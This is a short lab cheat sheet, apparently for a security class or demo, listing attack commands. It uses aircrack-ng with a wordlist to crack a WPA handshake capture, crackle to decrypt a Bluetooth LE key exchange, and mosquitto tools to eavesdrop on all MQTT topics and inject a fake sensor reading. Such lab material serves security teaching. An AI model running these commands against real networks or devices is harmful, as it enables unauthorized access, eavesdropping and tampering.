Wifi

aircrack-ng wpa-Induction.pcap
aircrack-ng -w rockyou.txt -b 00:0C:41:82:B2:55 wpa-Induction.pcap



Bluetooth

git clone https://github.com/mikeryan/crackle
crackle -i ltk_exchange.pcap
crackle -i ltk_exchange.pcap -o some.pcap


Install MQTT tools:
 
sudo apt install mosquitto mosquitto-clients
🧪 DEMO STEPS (for MQTT attack):
Start the MQTT server (IoT hub):
 
mosquitto
✅ This acts like an IoT base station.
 
Open another terminal: Simulate a device sending data:
 
mosquitto_pub -t "home/temperature" -m "24°C"
Open a third terminal: Spy on all data (attack):
 
mosquitto_sub -t "#" -v
✅ You’ll see the message:
home/temperature 24°C
 
Now pretend to be a fake device and send wrong info:
 
mosquitto_pub -t "home/temperature" -m "100°C"
✅ You just injected fake data — that’s an IoT attack.
